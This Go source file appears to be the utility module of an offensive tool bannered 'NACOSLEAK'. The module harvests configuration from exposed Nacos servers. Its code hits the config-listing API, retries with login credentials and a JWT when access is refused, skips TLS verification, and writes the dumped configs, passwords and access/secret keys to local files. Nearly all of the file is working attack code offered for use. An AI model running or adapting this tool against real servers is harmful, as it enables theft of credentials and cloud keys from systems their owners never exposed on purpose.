package utils

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	yaml "gopkg.in/yaml.v3"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

var CONFIG_API = "/nacos/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=100&tenant=&search=accurate"
var CONFIG_API_NGINX = "/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=100&tenant=&search=accurate"
var LOGIN_API = "/nacos/v1/auth/users/login"
var LOGIN_API_NGINX = "/v1/auth/users/login"
var Usrname string
var Passwd string
var Url string
var FolderName string

func GetConfig(url string) string {
	if strings.LastIndex(url, "/") == len(url)-1 {
		url = url[:len(url)-1]
	}
	resp := GetResp(url+CONFIG_API, false)
	if resp == nil {
		fmt.Println("[ ERROR ] Get Resp fail .")
		return ""
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("[ ERROR ] Get Resp's body fail .")
		return ""
	}
	Config := make(map[string]interface{})
	err = json.Unmarshal(body, &Config)
	var yaml_data interface{}
	var config string
	for _, v := range Config["pageItems"].([]interface{}) {

		for k, v := range v.(map[string]interface{}) {
			if k == "content" {
				yaml.Unmarshal([]byte(v.(string)), &yaml_data)
				config = config + v.(string)
			}
		}

	}
	fmt.Println("[ SUCCESS ] Get configs on nacos success .")
	return config
}

func GetResp(targetApi string, Auth bool) (resp *http.Response) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	clt := &http.Client{Transport: tr}
	reqest, err := http.NewRequest("GET", targetApi, nil)
	if Auth {
		jwt := getJWT(Url+LOGIN_API, Usrname, Passwd)
		if jwt == "" {
			fmt.Println("[ ERROR ] Get JWT fail :username or password is incorrect .")
			os.Exit(0)
		}
		reqest.Header.Set("accessToken", jwt)
	}
	resp, err = clt.Do(reqest)
	if err != nil {
		fmt.Println("[ ERROR ] Cannot connect to target, plz check out ")
		os.Exit(0)
	}
	if resp.StatusCode == 404 {
		resp = GetResp(Url+CONFIG_API_NGINX, false)
	}
	if resp.StatusCode == 401 {
		fmt.Println("[ INFO ] Get configs Fail, I think nacos.core.auth.enabled is true .")
		if Usrname != "" && Passwd != "" {
			fmt.Println("[ INFO ] start to get config with Auth .")
			resp = GetResp(targetApi, true)
			return resp
		} else {
			fmt.Println("[ ERROR ] target nacos needs Auth")
			os.Exit(0)
		}
	}
	if resp.StatusCode == 403 {
		fmt.Println("[ INFO ] Get configs Fail, I think nacos.core.auth.enabled is true .")
		if Auth {
			fmt.Println("[ ERROR ] username or password is incorrect .")
			os.Exit(0)
		} else {
			resp = GetResp(targetApi, true)
			return resp
		}

	}
	if resp.StatusCode == 200 {
		return resp
	}
	return nil
}

func getJWT(loginApi string, usrname string, passwd string) string {
	body := fmt.Sprintf("username=%s&password=%s", usrname, passwd)
	request, _ := http.NewRequest("POST", loginApi, strings.NewReader(body))
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := http.DefaultClient.Do(request)
	if err != nil {
		fmt.Println("[ ERROR ] send to " + Url + " fail .")
		return ""
	}
	if resp.StatusCode == 403 {
		return ""
	}
	if resp.StatusCode == 404 {
		jwt := getJWT(Url+LOGIN_API_NGINX, usrname, passwd)
		return jwt
	}
	respBody, _ := ioutil.ReadAll(resp.Body)
	respJson := make(map[string]interface{})
	err = json.Unmarshal(respBody, &respJson)
	//fmt.Println(respJson["accessToken"])
	fmt.Println("[ SUCCESS ] Get JWT success .")
	return respJson["accessToken"].(string)
}

func SaveConfig(url string, config string) bool {
	domain := url[7:]
	FolderName = strings.Replace(domain, ".", "_", -1)
	FolderName = strings.Replace(FolderName, ":", "_", -1)
	FolderName = "results/" + FolderName
	if !exists(FolderName) {
		err := os.MkdirAll(FolderName, 0766)
		if err != nil {
			fmt.Println(err)
		}
	}
	allConf := FolderName + "all_config.txt"
	f, err := os.Create(allConf)
	if err != nil {
		fmt.Println("[ ERROR ] create file fail .")
		return false
	} else {
		_, err = f.Write([]byte(config))
	}
	fmt.Println("[ SUCCESS ] Save in path:" + allConf)
	return true
}

func SavePasswd(passwdz []string) bool {
	passwdText := FolderName + "passwd.txt"
	f, err := os.Create(passwdText)
	if err != nil {
		fmt.Println("[ ERROR ] create file fail .")
		return false
	} else {
		for _, v := range passwdz {
			_, err = f.Write([]byte(v))
			_, err = f.Write([]byte("\n"))
		}
	}
	fmt.Println("[ SUCCESS ] Save in path:" + passwdText)
	return true
}

func SaveAKSK(akskz []string) bool {
	akskText := FolderName + "aksk.txt"
	f, err := os.Create(akskText)
	if err != nil {
		fmt.Println("[ ERROR ] create file fail .")
		return false
	} else {
		for _, v := range akskz {
			_, err = f.Write([]byte(v))
			_, err = f.Write([]byte("\n"))
		}
	}
	fmt.Println("[ SUCCESS ] Save in path:" + akskText)
	return true
}

func exists(path string) bool {
	_, err := os.Stat(path)
	if err != nil {
		if os.IsExist(err) {
			return true
		}
		return false
	}
	return true
}

func Banner() string {
	return `  
  _   _    _    ____ ___  ____  _     _____    _    _  __
 | \ | |  / \  / ___/ _ \/ ___|| |   | ____|  / \  | |/ /
 |  \| | / _ \| |  | | | \___ \| |   |  _|   / _ \ | ' / 
 | |\  |/ ___ \ |__| |_| |___) | |___| |___ / ___ \| . \ 
 |_| \_/_/   \_\____\___/|____/|_____|_____/_/   \_\_|\_\
                                         Author:a1  v1.0            `
}
